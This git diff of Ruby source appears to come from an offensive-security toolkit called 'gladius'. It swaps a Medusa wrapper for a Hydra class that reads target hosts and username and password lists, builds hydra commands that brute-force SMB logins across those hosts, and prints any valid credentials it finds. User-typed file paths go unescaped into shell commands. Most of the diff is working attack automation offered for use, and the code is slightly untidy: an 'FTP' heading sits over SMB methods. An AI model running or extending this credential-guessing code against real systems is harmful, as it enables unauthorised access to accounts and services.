@@ -1,50 +1,146 @@
 # Author: p$3ud0R@nD0m
 
-class Medusa < Weapon
-  def initialize(title)
+class Hydra < Weapon
+  def initialize(prev_menu, title)
+    @prev_menu = prev_menu
     @title = title
-    @@path = "medusa"
-    @@hosts = "/usr/share/gladius/input/stdn_hosts.txt"
-    #@@sshulist = "/usr/share/gladius/input/medusa_ssh_users.txt"
-    #@@sshplist = "/usr/share/gladius/input/medusa_ssh_passwords.txt"
-    @@time = Time.now
-    @@t = @@time.year.to_s + "-" + @@time.mon.to_s + "-" + @@time.day.to_s + "_" + @@time.hour.to_s + ":" + @@time.min.to_s + ":" + @@time.sec.to_s
-    @@out_file = "/usr/share/gladius/output/medusa_" + @@t + ".txt"
+    @path = "hydra"
+    @name = @path
+    @stdn_hosts = Path.get_path("stdn_hosts")
+    @smb_pwds_long = Path.get_path("smb_pwds_long")
+    @smb_usrs_long = Path.get_path("smb_usrs_long")
+    @mysql_pwds_long = Path.get_path("mysql_pwds_long")
+    @mysql_usrs_long = Path.get_path("mysql_usrs_long")
+    @postgresql_pwds_long = Path.get_path("postgresql_pwds_long")
+    @postgresql_usrs_long = Path.get_path("postgresql_usrs_long")
+    @ssh_pwds_long = Path.get_path("ssh_pwds_long")
+    @ssh_usrs_long = Path.get_path("ssh_usrs_long")
+    @stdn_pwds = Path.get_path("stdn_pwds")
+    @stdn_usrs = Path.get_path("stdn_usrs")
+    @telnet_pwds_long = Path.get_path("telnet_pwds_long")
+    @telnet_usrs_long = Path.get_path("telnet_usrs_long")
   end
 
-  def header_medusa
+###############################################################################
+# DRY methods
+###############################################################################
+  # Get target(s) and pass to relevant run method
+  def menu(run_method)
     header
-    puts "The target exhaustion time is ~7 hours per host, assuming ~26 attempts per minute.".light_yellow
-    puts "If the exhaustion time needs modified, edit the appropriate input files w/in the /usr/share/gladius/input directory.".light_yellow
-    puts
     instruct_input_targets("fqdn", "ip")
+    a = File.open(@stdn_hosts, "w")
+    while line = gets
+      a << line
+    end
+    a.close
+    stdn_hosts = @stdn_hosts
+    line_count = `wc -l #{stdn_hosts}`.to_i
+    puts
+    case line_count
+    when 0 then puts "No hosts were input.".red
+      menu(run_method)
+    when 1 then puts "Select your tactic:".light_yellow
+      puts "Since only 1 host was input, we recommend option 1.".yellow
+    when 2..5 then line_count = line_count.to_s
+      puts "Select your tactic:".light_yellow
+      puts "Since only #{line_count} hosts were input, we recommend option 1.".yellow
+    else line_count = line_count.to_s
+      puts "Since #{line_count} hosts were input, we recommend option 2 or 3.".yellow
+    end
+    
+    case run_method
+    when "smb" then puts "1. 476 attempts/host = 14 users * 34 passwords"
+    end
+    puts "2. Input your own users and passwords."
+    puts "3. Input your own user and password files."
+    
+    input_method = gets.to_i
+    case run_method
+    when "smb"
+      case input_method
+      when 1 then smb_gladius_long
+      when 2 then smb_stdn
+      when 3 then smb_stdn_list
+      end
+    end
+  rescue Interrupt
+    GExeption.new.exit_weapon("Hydra", @prev_menu)
   end
   
-  # Brute force ssh
-#  def ssh
-#    header_medusa
-#    a = File.open(@@hosts, "w")
-#    while line = gets
-#      a << line
-#    end
-#    a.close
-#    hosts = @@hosts
-#    line_count = `wc -l #{hosts}`.to_i
-#    if line_count == 0
-#      puts "No hosts were input.".red
-#    else
-#      puts
-#      i = Gpty.new
+  # Parse and exit
+  def clean_exit(search_term)
+    puts
+    if File.exist?(@out_file)
+      out_file = @out_file
+      results = open(@out_file) { |a| a.grep(/\[#{search_term}\]/) }
+      if results.count == 0
+        puts "Hydra did not find valid credentials.".light_yellow
+      else
+        puts "Hydra found the following credentials:".light_yellow
+        puts results
+      end
+    end
+    puts
+    if File.exist?(@out_file)
+      puts "Raw output can be found here:".yellow
+      puts @out_file
+    end
+  exit_weapon
+  end
+
+###############################################################################
+# Run methods
+###############################################################################
+##################################
+# FTP
+##################################
+  def smb_gladius_long
+    @out_file = get_out_file_txt(@name)
 #      i.cmd = @@path + " -H " + @@hosts + " -U " + @@sshulist + " -P " + @@sshplist + " -M ssh -n 7750 -e ns -O " + @@out_file
-#      i.shell
-#      puts
-#    end
-#    DictionaryOnline.new("Online Dictionary Attacks").menu
-#    # Catch interrupt
-#    rescue Interrupt
-#      puts
-#      puts "Cracking stopped due to interrupt.".light_yellow
-#      puts
-#      DictionaryOnline.new("Online Dictionary Attacks").menu
-#  end
+
+    cmd = @path + " -V -t 8 -w 64 -e ns -L " + @smb_usrs_long + " -P " + @smb_pwds_long + " -M " + @stdn_hosts + " smb |tee " + @out_file
+    run(cmd)
+    clean_exit("smb")
+  end
+
+  def smb_stdn
+    instruct_input_usrs
+    puts "root".yellow
+    puts "smb".yellow
+    puts
+    a = File.open(@stdn_usrs, "w")
+    while line = gets
+      a << line
+    end
+    a.close
+    stdn_usrs = @stdn_usrs
+    puts
+    instruct_input_pwds
+    puts "password".yellow
+    puts "abc123".yellow
+    puts
+    a = File.open(@stdn_pwds, "w")
+    while line = gets
+      a << line
+    end
+    a.close
+    stdn_pwds = @stdn_pwds
+    @out_file = get_out_file_txt(@name)
+    cmd = @path + " -V -t 8 -w 64 -L " + @stdn_usrs + " -P " + @stdn_pwds + " -M " + @stdn_hosts + " smb |tee " + @out_file
+    run(cmd)
+    clean_exit("smb")
+  end
+  
+  def smb_stdn_list
+    instruct_input_usrs_list
+    stdn_usrs = gets.chomp
+    puts
+    instruct_input_pwds_list
+    stdn_pwds = gets.chomp
+    puts
+    @out_file = get_out_file_txt(@name)
+    cmd = @path + " -V -t 8 -w 64 -L #{stdn_usrs} -P #{stdn_pwds} -M " + @stdn_hosts + " smb |tee " + @out_file
+    run(cmd)
+    clean_exit("smb")
+  end
 end  
